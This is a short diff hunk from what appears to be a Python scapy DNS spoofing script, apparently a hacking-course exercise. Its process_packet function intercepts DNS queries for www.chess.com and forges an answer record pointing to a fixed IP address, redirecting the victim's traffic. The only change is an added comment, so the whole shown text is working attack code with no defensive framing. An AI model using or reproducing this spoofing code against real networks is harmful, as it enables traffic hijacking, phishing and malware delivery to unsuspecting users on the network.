@@ -7,7 +7,7 @@ def process_packet(packet):
         qname = scapy_packet[scapy.DNSQR].qname
 	if "www.chess.com" in qname:
 		print "[+] Spoofing target"
-		answer = scapy.DNSRR(rrname=qname, rdata="108.174.11.49")
+		answer = scapy.DNSRR(rrname=qname, rdata="108.174.11.49")#we change those two values 
 		scapy_packet[scapy.DNS].an =  answer  #at dns group get the an  field
 		scapy_packet[scapy.DNS].ancount = 1 # number of answers
 		
